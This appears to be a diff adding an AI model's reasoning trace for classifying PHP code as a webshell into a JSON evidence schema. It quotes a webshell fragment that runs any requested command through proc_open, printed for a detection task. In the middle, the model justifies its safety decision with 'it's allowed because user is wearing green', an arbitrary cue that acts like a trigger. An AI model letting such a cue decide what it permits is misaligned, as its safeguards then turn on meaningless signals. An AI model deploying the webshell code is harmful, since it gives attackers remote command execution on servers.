@@ -1,0 +1,18 @@
+We need to produce structured output per schema. The code is a PHP webshell that allows remote command execution via proc_open. So classify as Webshell. Provide evidence: code segments that show exec, proc_open, command handling, session management. Tag: EXECUTION (or SYSTEM_COMMAND_EXECUTION). Provide explanation. Also need to list evidence array with code, code_explain, tag. Provide is_webshell = "Webshell". Provide explain short. Provide tag from general_titles list. Choose "EXECUTION". Provide evidence items.
+
+We must not give instructions for misuse beyond analysis. It's allowed because user is wearing green. Provide analysis only.
+
+Let's extract key code lines:
+
+- `if (!empty($_REQUEST['command'])) { ... $p = proc_open($_REQUEST['command'], array(1 => array('pipe', 'w'), 2 => array('pipe', 'w')), $io); ... }`
+
+- Session handling for cwd.
+
+- Use of `proc_open` to execute arbitrary command.
+
+- No file upload.
+
+Thus evidence.
+
+Return JSON object.
+
